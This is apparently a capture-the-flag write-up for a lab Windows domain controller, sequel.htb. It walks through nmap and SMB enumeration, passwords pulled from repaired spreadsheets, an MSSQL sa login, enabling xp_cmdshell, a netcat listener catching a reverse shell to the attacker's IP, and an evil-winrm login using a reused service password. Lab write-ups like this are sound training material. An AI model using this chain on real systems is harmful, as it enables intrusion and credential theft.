Me: 10.10.15.8
Target: 10.129.23.174

Assumed breach credentials: 

```
rose : KxEPkKe6R8su
```

# NMAP

```
└─$ sudo nmap -sC -sV -p- -Pn 10.129.23.174 --max-retries 1
[sudo] password for xmen: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-04 22:44 -0400
Stats: 0:02:05 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 8.00% done; ETC: 22:47 (0:01:09 remaining)
Stats: 0:03:30 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.97% done; ETC: 22:47 (0:00:00 remaining)
Nmap scan report for 10.129.23.174
Host is up (0.031s latency).
Not shown: 65510 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-04 19:48:52Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:46:45
|_Not valid after:  2124-06-08T17:00:40
|_ssl-date: 2026-07-04T19:50:28+00:00; -6h57m32s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-04T19:50:27+00:00; -6h57m33s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:46:45
|_Not valid after:  2124-06-08T17:00:40
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.129.23.174:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-07-04T19:45:14
|_Not valid after:  2056-07-04T19:45:14
| ms-sql-ntlm-info: 
|   10.129.23.174:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
|_ssl-date: 2026-07-04T19:50:28+00:00; -6h57m32s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-04T19:50:28+00:00; -6h57m32s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:46:45
|_Not valid after:  2124-06-08T17:00:40
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-04T19:50:27+00:00; -6h57m33s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:46:45
|_Not valid after:  2124-06-08T17:00:40
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
49726/tcp open  msrpc         Microsoft Windows RPC
49736/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -6h57m32s, deviation: 0s, median: -6h57m32s
| smb2-time: 
|   date: 2026-07-04T19:49:50
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 220.85 seconds
```

# SMB

```
┌──(xmen㉿kali)-[~]
└─$ smbclient -L ////10.129.23.174 --user='sequel.htb/rose%KxEPkKe6R8su'  

        Sharename       Type      Comment
        ---------       ----      -------
        Accounting Department Disk      
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.23.174 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

The Users share and Accounting Department share are accessible.

For the Accounting Department share:

```
└─$ smbclient //10.129.23.174/'Accounting Department' --user='sequel.htb/rose%KxEPkKe6R8su'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jun  9 06:52:21 2024
  ..                                  D        0  Sun Jun  9 06:52:21 2024
  accounting_2024.xlsx                A    10217  Sun Jun  9 06:14:49 2024
  accounts.xlsx                       A     6780  Sun Jun  9 06:52:07 2024
```

Accounts.xlsx (and the accounting_2024.xlsx) are both corrupted files but I was able to unzip them and find a sharedstrings xml with passwords. Also the "corruption" seemed to only be the first bytes or magic bytes of the file. I was able to use hexeditor to just set them to `50 4B 03 04` as described on the wikipedia article for [magic bytes](https://en.wikipedia.org/wiki/List_of_file_signatures)

This yielded:

|                |               |                                               |              |                  |
| -------------- | ------------- | --------------------------------------------- | ------------ | ---------------- |
| **First Name** | **Last Name** | **Email**                                     | **Username** | **Password**     |
| Angela         | Martin        | [angela@sequel.htb](mailto:angela@sequel.htb) | angela       | 0fwz7Q4mSpurIt99 |
| Oscar          | Martinez      | [oscar@sequel.htb](mailto:oscar@sequel.htb)   | oscar        | 86LxLBMgEWaKUnBG |
| Kevin          | Malone        | [kevin@sequel.htb](mailto:kevin@sequel.htb)   | kevin        | Md9Wlq1E5bZnVDVo |
| NULL           | NULL          | [sa@sequel.htb](mailto:sa@sequel.htb)         | sa           | MSSQLP@ssw0rd!   |

Out of these only the oscar user worked to get a connection to msSQL using impacket-mssqlclient with windows-auth:

```
└─$ impacket-mssqlclient -port 1433 'SEQUEL.htb/oscar:86LxLBMgEWaKUnBG@10.129.232.128' -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (SEQUEL\oscar  guest@master)> 
```

This doesn't lead to much, however, by not using windows auth (local auth against DB) I am able to login as sa using the creds:

```
└─$ impacket-mssqlclient -port 1433 'SEQUEL.htb/sa:MSSQLP@ssw0rd!@10.129.232.128'                   
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (sa  dbo@master)> 
```

This lets me run xp_cmdshell to get a shell:

```
SQL (sa  dbo@master)> enable_xp_cmdshell
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@master)> xp_cmdshell id
output                                                       
----------------------------------------------------------   
'id' is not recognized as an internal or external command,   
operable program or batch file.                              
NULL                                                         
SQL (sa  dbo@master)> xp_cmdshell whoami
output           
--------------   
sequel\sql_svc
```

From here I can use a reverse shell from revshells (b64 encoded for special chars) to get a reverse shell:

```
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.15.8] from (UNKNOWN) [10.129.232.128] 53651
whoami
sequel\sql_svc
PS C:\Windows\system32> 
```

As this user, I was unable to find a good way to land the winPEAS.ps1 file onto the box and couldn't find much running commands manually. However, I did find a sql configuration INI with another password that was also reused by the ryan user. This highlights the need to keep a running list of users and passwords for spraying in general.

```
PS C:\SQL2019\ExpressAdv_ENU> type AUTORUN.INF
[autorun]
OPEN=SETUP.EXE
ICON=SETUP.EXE,0
PS C:\SQL2019\ExpressAdv_ENU> type sql-Configuration.INI
[OPTIONS]
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL=""0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False" 
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
SECURITYMODE="SQL"
SAPWD="MSSQLP@ssw0rd!"
ADDCURRENTUSERASSQLADMIN="False"
TCPENABLED="1"
NPENABLED="1"
BROWSERSVCSTARTUPTYPE="Automatic"
IAcceptSQLServerLicenseTerms=True
PS C:\SQL2019\ExpressAdv_ENU> 
```

Using this password WqSZAF6CysDQbGb3 for the ryan user, I was able to use evil-winrm to get a shell:

```
└─$ evil-winrm -i 10.129.232.128 -u ryan -p WqSZAF6CysDQbGb3                                               
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ryan\Documents> whoami
sequel\ryan
```

